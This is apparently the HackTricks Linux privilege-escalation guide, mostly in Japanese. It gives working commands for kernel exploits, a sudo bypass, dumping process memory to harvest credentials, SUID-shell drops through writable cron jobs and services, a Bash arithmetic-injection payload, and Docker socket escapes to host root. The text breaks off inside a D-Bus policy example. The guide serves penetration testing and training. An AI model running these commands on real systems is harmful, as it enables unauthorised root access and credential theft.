# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSの情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし**`PATH`変数内の任意のフォルダに書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### Env info

環境変数に興味深い情報、パスワード、または API キーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、権限昇格に使用できる exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良いリストと、いくつかの既に**compiled exploits**はここで見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも**compiled exploits**が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits の検索に役立つツールは次のとおりです:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x 用の exploit のみをチェックします)

必ず **kernel のバージョンを Google で検索してください**。あなたの kernel バージョンが何らかの kernel exploit に記載されている場合があり、その exploit が有効であることを確認できます。

追加の kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo のバージョン

以下に示されている脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って、sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo のバージョンが 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）のものでは、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` が使用される場合、権限のないローカルユーザーが sudo の `--chroot` オプションを介して root 権限に昇格できることがあります。

その脆弱性を悪用するための [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) はこちらです。エクスプロイトを実行する前に、`sudo` のバージョンが脆弱であることと、`chroot` 機能をサポートしていることを確認してください。

詳細はオリジナルの [脆弱性アドバイザリ](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

このvulnがどのように悪用されるかの**例**については、**smasher2 box of HTB**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 想定される防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もしあなたが docker container の中にいる場合、そこから escape を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

何がどこに**mounted and unmounted**されているか、そしてなぜそうなっているかを確認する。もし何かが unmounted であれば、それを mount して機密情報を確認してみる。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用な binaries を列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか確認してください**。いくつかの kernel exploit を使う必要がある場合に役立ちます。使用するマシン（または類似のマシン）でコンパイルすることが推奨されているためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストール済みパッケージとサービスのバージョン**を確認してください。もしかすると古い Nagios バージョン（例えば）があり、escalating privileges に悪用される可能性があります…\  
It is recommended to check manually the version of the more suspicious installed software.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _これらのコマンドはほとんど役に立たない大量の情報を表示することがあるため、インストール済みソフトウェアのバージョンが既知の exploits に対して脆弱かどうかを確認する OpenVAS や同様のアプリケーションを使用することを推奨します_

## プロセス

実行されている**どのプロセス**を確認し、任意のプロセスが**必要以上の権限を持っていないか**チェックしてください（例えば tomcat が root によって実行されているかもしれません？）
```bash
ps aux
ps -ef
top -n 1
```
常に [**electron/cef/chromium debuggers** が実行されていないか確認してください。悪用して権限昇格できる可能性があります](electron-cef-chromium-debugger-abuse.md)。**Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータをチェックしてそれらを検出します。\
また、**プロセスのバイナリに対する権限も確認してください**。誰かのバイナリを書き換えられるかもしれません。

### プロセス監視

プロセスの監視には [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行されている場合や、一定の条件が満たされたときに特定するのに非常に有用です。

### プロセスメモリ

サーバの一部サービスは、**メモリ内に平文で credentials を保存**していることがあります。\
通常、他ユーザーのプロセスのメモリを読むには **root privileges** が必要なため、これは既に root でさらに資格情報を発見したい場合に有用です。\
ただし、**一般ユーザーでも、自分が所有するプロセスのメモリは読むことができる**ことを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

例えば FTP サービスのメモリにアクセスできれば、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセス ID に対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示します**。また **各マッピング領域のアクセス権** も示します。 その **mem** 擬似ファイルは **プロセスのメモリ自体を公開します**。**maps** ファイルから、どの **メモリ領域が読み取り可能か** とそのオフセットがわかります。この情報を使って、**mem ファイル内をシークして読み取り可能な領域をすべてダンプ**してファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへアクセスするもので、仮想メモリへはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみ読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は、Windows 向けの Sysinternals スイートにある古典的な ProcDump ツールを Linux 向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root の要件を手動で削除して、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの資格情報

#### 手動の例

authenticator プロセスが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpして（前のセクションを参照し、プロセスのmemoryをdumpするさまざまな方法を確認してください）memory内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み**、およびいくつかの**既知のファイル**から取得します。正しく動作させるにはroot権限が必要です。

| 機能                                              | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.

典型的な流れ
- `ss -ntlp` / `curl -v localhost:8000` を使って、loopback のみでリッスンしているポート（例: 127.0.0.1:8000）と Basic-Auth の realm を発見する
- 運用アーティファクトから資格情報を見つける:
  - パスワード付きのバックアップ/スクリプト (`zip -P <password>`)
  - systemd ユニットで `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` が公開されている
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即実行する（drops SUID shell）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使ってください:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UI を root として実行しないこと; 専用のユーザーと最小限の権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードを使い回さない
- ユニットファイルにシークレットを埋め込まない; secret stores または root-only EnvironmentFile を使用する
- on-demand job executions に対する audit/logging を有効にする

スケジュールされた job が脆弱かどうか確認する。root によって実行されるスクリプトを利用できるかもしれない（wildcard vuln? root が使用するファイルを変更できるか? symlinks を使えるか? root が使うディレクトリ内に特定のファイルを作成する?）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中に次のような PATH があるのが分かります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron を使用した、ワイルドカードを含むスクリプト (Wildcard Injection)

スクリプトが root によって実行され、そのコマンド内に “**\***” が含まれている場合、予期しない動作（例えば privesc）を引き起こすように悪用できます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も同様です）。**

次のページを読んで、より詳しい wildcard exploitation tricks を参照してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...)), $((...)) および let の算術評価より前に parameter expansion と command substitution を実行します。root の cron/parser が untrusted なログフィールドを読み取りそれらを算術コンテキストに渡すと、攻撃者はコマンド置換 $(...) を注入でき、cron 実行時に root としてそのコマンドが実行されます。

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 解析されるログに attacker-controlled なテキストを書き込み、数値に見えるフィールドが command substitution を含み末尾が数字になるようにします。算術が有効なままでいるように、コマンドが stdout に出力しない（またはリダイレクトする）ことを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される **cron スクリプトを修正できる** なら、非常に簡単にシェルを取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるスクリプトが**あなたが完全にアクセスできるディレクトリ**を使用している場合、そのフォルダを削除して、あなたが制御するスクリプトを配置する別の場所への**symlinkフォルダを作成する**ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 書き込み可能なペイロードを持つカスタム署名された cron バイナリ
Blue teams は、root として実行する前にカスタム ELF セクションをダンプしてベンダー文字列を grep することで、cron 駆動バイナリに「署名」することがあります。もしそのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770` 所有）で、署名用の素材を leak できるなら、セクションを偽造して cron タスクをハイジャックできます:

1. `pspy` を使って検証フローをキャプチャします。Era の例では、root は `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していました。
2. leaked な key/config（`signing.zip` から）を使って期待される証明書を再作成します:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意のある置換を作成（例: SUID bash を配置する、あなたの SSH key を追加する）し、証明書を `.text_sig` に埋め込んで grep が通るようにします:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを保持したまま、スケジュールされたバイナリを上書きします:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待ちます。単純な署名チェックが通ると、あなたのペイロードが root として実行されます。

### 頻繁な cron ジョブ

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探せます。これを利用して権限昇格できるかもしれません。

例えば、**1分間、0.1秒ごとに監視する**、**実行回数が少ないコマンドでソートする**、そして最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これにより起動するすべてのプロセスが監視され一覧表示されます)。

### 見えない cron jobs

コメントの後に**carriage returnを入れる**（without newline character）とcronjobが動作します。例（carriage return文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### Writable _.service_ files

任意の `.service` ファイルに書き込み可能か確認してください。もし可能なら、それを**修正する**ことで、サービスが**開始**、**再起動**、または**停止**されたときにあなたの**backdoor**を**実行**させることができます（マシンの再起動を待つ必要があるかもしれません）。\
例えば、.service ファイル内で backdoor を作成し、**`ExecStart=/tmp/script.sh`** と指定します

### Writable service binaries

サービスによって実行されるバイナリに対して**書き込み権限を持っている**場合、それらを backdoors に差し替えることで、サービスが再実行されたときに backdoors が実行されるようにできます。

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることがわかった場合、**escalate privileges**できる可能性があります。サービス設定ファイルで**relative paths being used on service configurations**のような相対パスが使用されていないか検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、**相対パスのバイナリと同じ名前**の**実行ファイル**を作成し、サービスが脆弱なアクション（**開始**、**停止**、**再読み込み**）を実行するように要求されたとき、あなたの**backdoor が実行されます**（通常、権限のないユーザはサービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー**は systemd ユニットファイルで、その名前が `**.timer**` で終わり、`**.service**` ファイルやイベントを制御します。**タイマー**はカレンダー時間イベントや単調時間イベントを標準でサポートし、非同期で実行できるため、cron の代替として使えます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを修正できる場合、systemd.unit の既存ユニット（例: `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときにアクティベートされるユニット。引数は接尾辞が ".timer" ではないユニット名です。指定しない場合、この値はタイマーユニットと同じ名前（接尾辞を除く）を持つ service にデフォルトされます。（上記参照。）アクティベートされるユニット名とタイマーユニットのユニット名は、接尾辞を除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **書き込み可能なバイナリを実行している**
- Find some systemd unit that is **相対パスを実行している** and you have **書き込み権限** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **タイマーを有効にする**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで **有効化** されます。

## ソケット

Unix Domain Sockets (UDS) はクライアント・サーバーモデル内で同一または異なるマシン間の **プロセス間通信** を可能にします。これらは標準の Unix ディスクリプタファイルを用いてコンピュータ間の通信を行い、`.socket` ファイルを通じて設定されます。

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要約すると**どこでソケットをリッスンするかを指定**します（AF_UNIX ソケットファイルのパス、IPv4/6 やポート番号など）。
- `Accept`: ブール引数を取ります。**true** の場合、**着信接続ごとにサービスインスタンスが生成**され、その接続ソケットのみが渡されます。**false** の場合、すべてのリッスンソケット自体が**起動された service unit に渡され**、すべての接続に対して単一の service unit が生成されます。この値は datagram ソケットおよび FIFO では無視され、これらでは単一の service unit が無条件にすべての着信トラフィックを処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 行以上のコマンドラインを取り、これらはリッスンする **sockets**/FIFO が作成されバインドされる**前**または**後**に**実行**されます。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets**/FIFO が閉じられ削除される**前**または**後**に**実行**される追加の **コマンド** です。
- `Service`: 着信トラフィック時に**起動する** **service** ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトではソケットと同じ名前の service（サフィックスを置換したもの）になります。ほとんどの場合、このオプションを使用する必要はありません。

### Writable .socket files

もし **書き込み可能な** `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を **追加** することができ、その backdoor はソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があるでしょう。**\
_注意: システムがそのソケットファイル設定を使用していなければ、backdoor は実行されません_

### Writable sockets

もし **書き込み可能な socket** を特定した場合（_ここで言っているのは config の `.socket` ファイルではなく Unix Socket のことです_）、その socket と **通信** でき、脆弱性を突いてエクスプロイトできる可能性があります。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitationの例:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

いくつかの **sockets listening for HTTP** requests が存在する可能性があることに注意してください（_.socket files のことではなく、unix sockets として動作するファイルのことを指しています_）。確認するには次のコマンドを実行します:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが **HTTP リクエストに応答する** 場合、そのソケットと**通信**でき、場合によっては**脆弱性を exploit**できるかもしれません。

### 書き込み可能な Docker ソケット

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使うと、ホストのファイルシステムに対して root 権限でアクセスできるコンテナを実行できます。

#### **Using Docker API Directly**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 使用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナへの接続を確立し、コンテナ内でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、コンテナ内でコマンドを実行し、ホストのファイルシステムに対する root 権限での操作が可能になります。

### Others

docker socket に対して書き込み権限がある（**inside the group `docker`** のメンバーである）場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が利用できます。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) であれば、それを悪用して侵害できる可能性もあります。

次で**more ways to break out from docker or abuse it to escalate privileges**を確認してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`ctr` コマンドを使用できる場合は、次のページを読んでください（**you may be able to abuse it to escalate privileges**）:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`runc` コマンドを使用できる場合は、次のページを読んでください（**you may be able to abuse it to escalate privileges**）:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **inter-Process Communication (IPC) system** であり、アプリケーション間の効率的な相互作用とデータ共有を可能にします。現代の Linux システムを念頭に設計された堅牢なフレームワークを提供します。

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、**enhanced UNIX domain sockets** を思わせるものです。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通知が音楽プレーヤーにミュートを促すなど、ユーザー体験を向上させることができます。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は **allow/deny model** の上で動作し、ポリシー規則の総合的な効果に基づいてメッセージの権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーは bus とのやり取りを指定しており、権限の悪用を通じた privilege escalation の可能性を含みます。

例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるそのようなポリシーが示されており、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージを送受信できる権限が詳細に記述されています。

ユーザーやグループが指定されていないポリシーは全体に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてのものに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
